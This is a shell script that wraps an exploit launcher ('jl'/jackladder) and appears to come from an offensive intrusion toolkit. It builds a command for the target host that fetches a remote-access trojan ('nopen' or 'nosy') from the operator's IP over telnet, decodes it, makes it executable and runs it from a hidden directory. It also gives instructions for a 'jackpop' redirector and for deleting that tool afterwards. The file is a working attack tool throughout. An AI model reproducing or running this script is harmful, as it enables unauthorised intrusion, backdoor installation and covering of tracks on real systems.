#!/bin/sh
SYNTAX="<rem_ip> <loc_ip> <localport> <targetdir> \\
       <rat_file> [<jl_port>] [<rat_port> [nosy] ]
"
DEFJLPORT=13
PROG=`basename ${0}`
usage () {
    echo "
Usage: [RA=redirector-address RP=redirector-port] $PROG \\
       $SYNTAX
 *  RA and RP required if redirecting JL with jackpop
 *  jl is assumed to be in ./jl
 *  jl_port defaults to $DEFJLPORT (arg required if next arg is used)
 *  rat_port optional - default used if not given. BUT--if rat_port is
      given and nopen is not being used, the final argument must be
      nosy to send the older syntax up.

   e.g. $PROG alice LOCALIP 32177 /tmp/.X11R6 nscd
   e.g. $PROG alice LOCALIP 32177 /tmp/.X11R6 nscd 25 17348
   e.g. $PROG alice LOCALIP 32177 /tmp/.X11R6 nscd 113 33433 nosy

NOTE: You may now pre-set any/all of the following environment
      variables if using jackpop with $PROG (RA & RP required).

For jl.command
locally:            RA=redirector-address   RP=redirector-port

For jackpop on      LP=same-as-RP           SA=your-source-IP
redirector:         TA=target-address       TP=target-JL-port

      If you do not set LP and/or SA, they will be determined
      by the <jl_port> parameter and ifconfig. You will be prompted
      for TA and TP if they are not already set.
"
    exit
}
case "${#}" in
    0|1|2|3|4|9)
    usage
    ;;
esac

REMOTEIP=$1
LOCALIP=$2
LOCALPORT=$3
TARGETDIR=$4
RAT_FILE=$5
JLPORT=$6
RAT_PORT=$7
RAT_NAME=$8

[ "$RAT_NAME" ] || RAT_NAME=nopen

PLATFORM=`uname`
if [ "$PLATFORM" = "Linux" ]; then
  MINUSN=-n
else
  MINUSN=""
fi

if [ "$JLPORT" = "" ]; then
  JLPORT=$DEFJLPORT
fi
if [ "$RAT_PORT" != "" ]; then 
  if [ "$RAT_NAME" = "" ]; then
    echo You must supply rat_name with rat_port to determine server syntax
    echo ""
    usage
  fi
  if [ $RAT_PORT -lt 1025 -o $RAT_PORT -gt 65535 ]; then
    echo rat_port must be between 1025 and 65535, inclusive
    echo ""
    usage
  fi
  if [ "$RAT_NAME" = "nosy" ]; then
    RAT_ARG="P=$RAT_PORT "
  else
    if [ "$RAT_NAME" = "nopen" ]; then
	RAT_ARG="C=\"-l $RAT_PORT\" "
    else
	echo rat_name $RAT_NAME is not nosy or nopen
	echo ""
	usage
    fi
  fi
else
  RAT_ARG=""
fi

JACKPOP=0

if [ ! "$RA" = "" ] || [ ! "$RP" = "" ] ; then
    JACKPOP=1
    echo "
Using jackpop. Environment variables: 
   RA=\"$RA\"
   RP=\"$RP\""
    if [ "$RA" = "" ] || [ "$RP" = "" ] ; then
	echo "FATAL ERROR: Must have BOTH environment variables RA and RP set."
	exit 1
    fi
    if [ ! "$RP" = "$JLPORT" ] ; then
	echo "Shouldn't RP=JLPORT? 
(you have RP=$RP and JLPORT=$JLPORT)"
	echo $MINUSN "
Hit ^C to abort and fix this or hit enter to continue
(though that would most likely not work)."
	read quitans
    fi
    if [ ! "$RA" = "$REMOTEIP" ] || [ ! "$RA" = "$LOCALIP" ] ; then
	echo "Shouldn't RA=LOCALIP=REMOTEIP? (you have
   RA=$RA, LOCALIP=$LOCALIP
   and REMOTEIP=$REMOTEIP)"
	echo $MINUSN "
Hit ^C to abort and fix this or hit enter to continue
(though that would most likely not work)."
	read quitans
    fi
    echo ""
    if [ "$TA" ] ; then
	echo "Using TA=$TA as the actual target you are
redirecting through $REMOTEIP to get to."
    else
	echo $MINUSN "Enter the IP of your actual target you are
redirecting through $REMOTEIP to get to: "
	read TA
    fi
    echo ""
    if [ "$TP" ] ; then
	echo "Using TP=$TP as the actual target's JL trigger port."
    else
	echo $MINUSN "Enter actual target's JL trigger port: [$DEFJLPORT] "
	read TP
	[ "$TP" ] || TP=$DEFJLPORT
    fi
    echo ""
    if [ ! "$LP" ] ; then
	echo "Using LP=$RP as the listening port on redirector $REMOTEIP."
	LP=$RP
    fi

    LOCAL_IP_GUESS=`ifconfig ppp0 2>/dev/null | grep inet | grep -v grep | grep -v ":127\." | awk '{print $2}' | cut -d ":" -f 2`
    # if that fails maybe it's on eth*
    [ "$LOCAL_IP_GUESS" ] || LOCAL_IP_GUESS=`ifconfig -a | grep inet | grep -v grep | grep -v ":127\." | awk '{print $2}' | cut -d ":" -f 2`
    [ "$LOCAL_IP_GUESS" ] || echo "Unable to get local IP address..bailing" 
    [ "$LOCAL_IP_GUESS" ] || exit 1

    if [ "$SA" ] ; then
	if [ ! "$SA" = "$LOCAL_IP_GUESS" ] ; then
	    echo "Shouldn't SA=LOCAL_IP_GUESS? (you have
SA=$SA and the local IP appears to be
$LOCAL_IP_GUESS."
	    echo $MINUSN "
Hit ^C to abort and fix this or hit enter to continue
(though that would most likely not work)."
	    read quitans
	fi
    else
	SA=$LOCAL_IP_GUESS
    fi
fi

echo "
CommandLine: $PROG ${*}"

REALCMD="N=/dev/null
D=$TARGETDIR
PATH=\$D:/bin:/usr/bin:/sbin:/usr/sbin:/usr/bsd
mkdir \$D
cd \$D
telnet $LOCALIP $LOCALPORT | cat > $RAT_FILE.uu
uudecode $RAT_FILE.uu
if [ ! -f $RAT_FILE.Z ]; then
  telnet $LOCALIP 80
fi
uncompress -f $RAT_FILE.Z 
chmod 777 $RAT_FILE 
PATH=\$D ${RAT_ARG}${RAT_FILE}
exit 0"
export REALCMD


echo ""
echo ""
echo "CHECK SYNTAX IN REALCMD AND IN jl.command LINE BEFORE CONTINUING"
echo ""
echo "New order of arguments is: "
echo "$PROG $SYNTAX"
echo ""

echo "REALCMD=\"$REALCMD\""
echo ""
echo "Command about to be executed:"
echo " ./jl.command telnet $REMOTEIP $JLPORT"
echo ""

if [ $JACKPOP = 1 ] ; then
    echo "
Here's the jackpop command you need to run on your redirector:

   chmod 700 jp && PATH=. SA=$SA TA=$TA TP=$TP LP=$LP jp

### and don't forget to delete jackpop with one of:

   -rm jp
   rm jp

Once you have jackpop running on $REMOTEIP,"

fi
echo $MINUSN "hit enter to proceed, ^C to not: "

read junk

#now run jackladder

./jl.command telnet $REMOTEIP $JLPORT
